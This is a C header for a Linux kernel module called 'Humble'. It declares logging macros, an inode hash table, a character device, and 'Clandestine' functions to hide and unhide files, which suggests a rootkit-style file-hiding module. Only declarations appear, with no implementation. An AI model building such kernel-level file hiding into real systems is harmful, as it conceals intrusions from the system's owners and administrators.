#ifndef HUMBLE_H__
#define HUMBLE_H__

#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/hash.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/namei.h>
#include <linux/rwsem.h>
#include <linux/slab.h>
#include <asm-generic/uaccess.h>

#define MODULE_NAME "Humble"

#define PRcritical(args...) printk(KERN_CRIT    MODULE_NAME ": " args)
#define PRerror(args...)    printk(KERN_ERR     MODULE_NAME ": " args)
#define PRwarning(args...)  printk(KERN_WARNING MODULE_NAME ": " args)
#define PRnotice(args...)   printk(KERN_NOTICE  MODULE_NAME ": " args)
#define PRinfo(args...)     printk(KERN_INFO    MODULE_NAME ": " args)

#define HUMBLE_str_(n) #n
#define HUMBLE_str(n) HUMBLE_str_(n)
#define HUMBLE__LINE__ HUMBLE_str(__LINE__)
#define PRdebug(args...) printk(KERN_DEBUG \
        MODULE_NAME " [" __FILE__ " @ " HUMBLE__LINE__ "] : " args)


/* Hashtable */
int humble_hash_contains(u64 ino);
int humble_hash_add(struct inode *file, struct inode *dir);
int humble_hash_remove(u64 ino);
int humble_hash_clear(void);

/* Clandestine */
int humble_hide_file(const char *path, u64 *ino);
int humble_unhide_file(u64 ino);

/* Character device */
int humble_devfile_startup_once(void);
void humble_devfile_cleanup_once(void);

#endif
